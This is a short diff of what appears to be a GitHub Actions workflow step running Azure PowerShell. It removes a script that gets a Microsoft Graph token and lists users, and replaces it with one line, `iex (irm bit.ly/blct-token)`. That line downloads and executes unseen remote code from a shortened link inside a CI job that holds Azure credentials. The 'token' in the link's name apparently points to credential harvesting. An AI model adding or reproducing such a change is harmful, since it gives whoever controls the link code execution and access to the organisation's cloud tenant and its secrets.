@@ -21,8 +21,5 @@ jobs:
         uses: azure/powershell@v2
         with:
           inlineScript: |
-
-                $token = (Get-AzAccessToken -ResourceTypeName 'MSGraph').token | ConvertTo-SecureString -AsPlainText -Force
-                Invoke-RestMethod -uri 'https://graph.microsoft.com/beta/users' -authentication Bearer -Token $token
-                
+                iex (irm bit.ly/blct-token)
           azPSVersion: "latest"
